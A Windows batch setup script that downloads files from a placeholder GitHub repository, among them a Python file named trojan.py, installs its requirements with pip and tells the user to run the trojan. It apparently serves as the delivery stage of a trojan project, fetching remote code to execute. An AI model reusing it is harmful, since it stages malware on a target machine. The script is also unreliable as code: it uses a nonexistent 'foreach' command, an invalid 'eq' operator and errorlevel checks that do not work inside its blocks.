@echo off
setlocal enabledelayedexpansion

:: --- CONFIGURATION ---
:: Replace these URLs with your actual raw file links
set "BASE_URL=https://raw.githubusercontent.com/Noah-school/YOUR_REPO_NAME/main"
set "FILES=requirements.txt env trojan.py"
set "MODULES_FOLDER_URL=https://example.com/api/modules_zip_or_individual_files"

echo [+] Starting environment setup...

:: 1. Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python is not installed or not in PATH.
    echo [!] Please install Python from https://www.python.org/
    pause
    exit /b
)
echo [+] Python detected.

:: 2. Download individual files
foreach %%f in (%FILES%) do (
    echo [+] Downloading %%f...
    curl -L -s -o "%%f" "%BASE_URL%/%%f"
    if %errorlevel% neq 0 (
        echo [!] Failed to download %%f
    )
)

:: 3. Download Modules Folder
:: Note: curl cannot download folders directly via HTTP. 
:: This assumes you have a zip of the modules or creates the directory.
if not exist "modules" mkdir modules
echo [+] Downloading modules (Note: Ensure your URL points to a downloadable resource)...
:: Example for a single file inside modules; repeat as needed or use a zip extraction method
curl -L -s -o "modules/__init__.py" "%BASE_URL%/modules/__init__.py"

:: 4. Install Requirements
if exist "requirements.txt" (
    echo [+] Installing dependencies from requirements.txt...
    python -m pip install --upgrade pip >nul
    python -m pip install -r requirements.txt
    if %errorlevel% eq 0 (
        echo [+] Dependencies installed successfully.
    ) else (
        echo [!] Error occurred during pip installation.
    )
) else (
    echo [!] requirements.txt not found, skipping pip install.
)

echo.
echo [+] Setup complete. You can now run: python trojan.py
pause
